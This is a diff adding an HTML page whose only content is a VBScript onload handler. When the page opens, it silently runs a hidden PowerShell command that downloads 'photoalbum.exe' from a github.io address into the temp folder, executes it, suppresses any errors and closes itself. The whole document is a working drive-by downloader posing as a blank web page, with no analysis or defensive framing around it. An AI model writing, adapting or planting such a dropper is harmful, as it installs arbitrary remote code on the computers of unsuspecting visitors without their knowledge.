@@ -1,0 +1,23 @@
+<HTML> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD> 
+<script language="vbscript"> 
+Sub window_onload
+const impersonation = 3
+Const HIDDEN_WINDOW = 12
+Set Locator = CreateObject("WbemScripting.SwbemLocator") 
+Set Service = Locator.ConnectServer()
+Service.Security_.ImpersonationLevel=impersonation 
+Set objStartup = Service.Get("Win32_ProcessStartup") 
+Set objConfig = objStartup.SpawnInstance_ 
+objConfig.Showwindow = HIDDEN_WINDOW
+command = "powershell.exe -nologo -noninteractive -command try{$down = New-Object System.Net.WebClient;$url = 'https://valkiestargeu.github.io/alveroudione/photoalbum.exe';$file = $env:temp + '\photoalbum.exe';$down.DownloadFile($url,$file);$exec = New-Object -com shell.application;$exec.shellexecute($file);}catch{}exit;"
+set shell = CreateObject("WScript.Shell")
+shell.Run command,0, false
+self.close
+End Sub
+</script>
+<body>
+</body>
+</HEAD> 
+</HTML>
